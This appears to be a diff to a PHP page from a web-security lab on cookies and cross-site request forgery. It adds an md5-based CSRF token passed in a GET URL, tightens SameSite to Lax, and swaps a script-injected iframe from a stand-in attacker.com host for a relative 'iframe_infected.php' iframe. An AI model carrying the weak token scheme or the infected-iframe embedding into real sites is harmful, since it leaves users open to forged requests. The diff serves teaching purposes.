@@ -1,6 +1,9 @@
 <?php
-// Simulating a login cookie, assuming user has logged in to set this cookie
+// Defense token
+session_start();
+$_SESSION['csrf_token'] = md5(uniqid(mt_rand(), true));
 
+// Simulating a login cookie, assuming user has logged in to set this cookie
 if (isset($_GET["name"])) {
     $name = $_GET["name"];
     setcookie("login", $name, [
@@ -9,7 +12,7 @@ if (isset($_GET["name"])) {
         'domain' => 'host.com',
         'secure' => false,
         'httponly' => true,
-        'samesite' => 'None',
+        'samesite' => 'Lax',
     ]);
     echo "Cookie set ! : login=$name";
 } else {
@@ -22,11 +25,9 @@ if (isset($_GET["name"])) {
 </head>
 <body>
 <script>
-    const protocol = window.location.protocol;
-    const port = window.location.port;
-
     function call() {
-        const url = `${protocol}//host.com:${port}/tp5/ressources/simple.php`;
+        // add csrf defense token
+        const url = `simple.php?csrf_token=<?php echo $_SESSION["csrf_token"] ?>`;
         const params = {
             method: 'GET',
             credentials: 'include',
@@ -49,11 +50,6 @@ if (isset($_GET["name"])) {
     <button onclick="call()">Call the Server</button>
 </font>
 <div id=answer-div>Waiting for an answer...</div>
-<script>
-    const iframeInfected = document.createElement("iframe");
-    iframeInfected.src = `${protocol}//attacker.com:${port}/tp5/mycode/iframe_infected.php`;
-    iframeInfected.title = "infected iframe";
-    document.body.appendChild(iframeInfected);
-</script>
+<iframe id="iframe" src="../mycode/iframe_infected.php"></iframe>
 </body>
 </html>
